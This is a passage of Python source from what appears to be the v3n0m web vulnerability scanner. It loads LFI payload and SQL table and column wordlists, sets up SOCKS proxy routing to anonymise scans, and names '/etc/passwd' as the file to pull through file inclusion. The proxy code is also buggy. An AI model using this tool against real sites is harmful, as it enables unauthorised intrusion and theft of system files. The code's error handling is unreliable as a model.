lfis = [line.strip() for line in open("statics/lfi", 'r')]
tables = [line.strip() for line in open("statics/tables", 'r')]
columns = [line.strip() for line in open("statics/columns", 'r')]
search_Ignore = str(line.strip() for line in open("statics/search_ignore", 'r', encoding='utf-8'))
random.shuffle(d0rk)
random.shuffle(header)
random.shuffle(lfis)
parser = argparse.ArgumentParser(prog='v3n0m', usage='v3n0m [options]')
parser.add_argument('-p', "--proxy", type=str, help='Proxy must be in the form of type:host:port')
args = parser.parse_args()


# noinspection PyBroadException
def enable_proxy():
    global ProxyEnabled
    try:
        requiresID = bool(input("Requires Username/Password? Leave Blank if not required, otherwise type y/yes/true/True  :"))
        print(requiresID)
        print("Please select Proxy Type - Options = socks4, socks5  : ")
        proxytype = input(str())
        print(" Please enter Proxy IP address - ie. 127.0.0.66  :")
        proxyip = input(int)
        print(" Please enter Proxy Port - ie. 1076  :")
        proxyport = input(int)
        if proxytype == str("socks4"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = True
                except Exception:
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = True
                except Exception:
                    pass
        elif proxytype == str("socks5"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    print(" Socks 5 Proxy Support Enabled")
                    socks.socket = socks.socksocket
                    ProxyEnabled = True
                except Exception:
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    ProxyEnabled = True
                except Exception:
                    pass
    except Exception:
        pass


# This is the updated MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni

try:
    codecs.lookup('mbcs')

except LookupError:
    ascii_encoding = codecs.lookup('latin-1')


    def mbcs_bypass(name, encoding=ascii_encoding):
        if name == "mbcs":
            return encoding


    codecs.register(mbcs_bypass)

# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"




subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60  # Change this at your will
endsub = 1
gets = 0
timeout = 14
file = "/etc/passwd"
ProxyEnabled=False
menu = True
current_version = 410.1
while True:
    fmenu()
